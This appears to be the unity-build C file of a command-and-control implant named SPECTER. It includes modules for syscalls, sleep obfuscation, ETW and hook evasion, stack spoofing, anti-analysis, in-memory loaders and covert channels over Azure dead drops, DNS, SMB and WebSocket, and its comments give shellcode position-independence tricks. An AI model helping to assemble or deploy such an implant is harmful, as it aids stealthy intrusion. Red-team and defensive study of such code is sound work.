/**
 * SPECTER Implant — Unity Build
 *
 * Single compilation unit that includes all source files.
 * This eliminates cross-object .refptr pseudo-GOT entries that break
 * position independence when the PIC blob is loaded at runtime.
 *
 * MinGW generates .refptr stubs for extern globals across translation
 * units. By compiling everything as one unit, all references become
 * direct RIP-relative — truly position-independent.
 */

/* Core modules */
#include "hash.c"
#include "string.c"
#include "peb.c"
#include "heap.c"
#include "crypto.c"
#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
#include "crypto_sign.c"
#endif
#include "syscalls.c"
#include "syscall_wrappers.c"
#ifndef SPECTER_BAREBONE
#include "transform.c"
#endif
#include "config.c"
#ifndef SPECTER_BAREBONE
#include "profile.c"
#endif
#ifdef SPECTER_BAREBONE
#include "sleep_barebone.c"
#else
#include "sleep.c"
#endif
#include "comms.c"

/* Evasion modules */
#include "evasion/evasion_core.c"
#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULE_OVERLOAD)
#include "evasion/modoverload.c"
#endif
#if !defined(SPECTER_BAREBONE) || defined(SPECTER_LAB_CLEAN_SLEEP_ENTRY)
#include "evasion/ntcontinue_entry.c"
#endif
#ifndef SPECTER_BAREBONE
#include "evasion/stackspoof.c"
#include "evasion/hooks.c"
#include "evasion/etw.c"
#include "evasion/memguard.c"
#include "evasion/antianalysis.c"
#include "evasion/pdata_reg.c"
#endif

#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
/* Bus / module system */
#include "bus/bus_api.c"
#include "bus/loader.c"
#include "bus/guardian.c"
#include "bus/lifecycle.c"
#ifndef SPECTER_BAREBONE_MODULES
#include "bus/beacon_shim.c"
#include "bus/clr.c"
#include "bus/inline_asm.c"
#endif
#endif

/* Task execution - after bus modules so g_modmgr is visible in full builds */
#include "task_exec.c"

#ifndef SPECTER_BAREBONE
/* Comms channel implementations */
#include "comms/azure_deadrop.c"
#include "comms/dns.c"
#include "comms/smb.c"
#include "comms/websocket.c"
#endif

/* Entry point — MUST be last so .text.entry section ordering works,
   or use the linker script to place it first regardless */
#include "entry.c"
